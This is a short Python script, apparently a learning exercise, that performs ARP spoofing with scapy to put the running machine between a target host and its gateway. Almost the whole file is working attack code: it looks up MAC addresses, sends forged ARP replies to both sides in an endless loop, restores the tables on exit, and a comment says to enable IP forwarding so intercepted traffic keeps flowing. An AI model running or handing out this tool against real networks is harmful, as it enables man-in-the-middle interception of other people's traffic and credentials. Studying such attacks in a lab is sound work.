#!/usr/bin/env python
import time
import argparse
import scapy.all as scapy


# created by Wambugu
# 30-08-2022

# def get_arguments():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-t", "--target-ip", dest=target_ip, help="target / victims ip address of victim")
#     parser.add_argument("-g", "--gateway-ip", dest=gateway_ip, help="gateway / routers ip address")
#     (options, arguments) = parser.parse_args()
#     if not options.target_ip:
#         parser.error("[-] Please specify the a target ip address, use --help for more info.")
#     elif not options.gateway_ip:
#         parser.error("[-] Please specify the a gateway ip address, use --help for more info.")
#     return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # get IPs of clients from arp broadcast request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # send arp request to the broadcast address
    arp_request_broadcast = broadcast / arp_request
    # capture answered result packets in a list, set a time to end search and less verbose result
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.x.y"  # get_arguments(options.target_ip)
gateway_ip = "192.168..x.y"  # get_arguments(options.gateway_ip)

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # python3 dynamic printing
        # print("\r[+] Packets sent: " + str(sent_packets_count)),   #  for python 2.7 and below
        #  sys.stdout.flush() for python 2.7 and below
        time.sleep(2)
except KeyboardInterrupt:
    print("\r[+] Pressed CTRL + C, Exiting and resetting ARP table ... Please wait...\n")
    restore(target_ip, gateway_ip)

    # echo 1 > /proc/sys/net/ipv4/ip_forward
    # above command allows packets to flow through attacking machine without being dropped
    #  run the command before running the program
